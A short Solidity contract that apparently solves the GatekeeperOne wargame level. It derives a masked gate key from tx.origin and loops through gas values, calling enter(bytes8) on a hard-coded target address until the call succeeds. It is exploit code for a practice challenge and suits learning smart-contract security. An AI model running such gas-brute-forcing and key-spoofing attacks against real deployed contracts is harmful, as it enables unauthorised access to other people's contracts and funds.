// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
contract Attack {

    bytes8 _gateKey = bytes8(uint64(uint160(tx.origin))) & 0xFFFFFFFF0000FFFF;
    //modifier-one contract address
    GatekeeperOne target = GatekeeperOne(0xa6165bbb69f7e8f3d960220B5F28e990ea5F630D);

    function hack() public returns(uint){
        uint i=0;
        for (i; i < 8191; i++) { 
            //external call limit :at least 21000 gas
            (bool result,) = address(target).call{gas:i + 8191 * 3}(abi.encodeWithSignature("enter(bytes8)", _gateKey));

            if (result) {
                break;
            }
        }
        return i;
    }
}
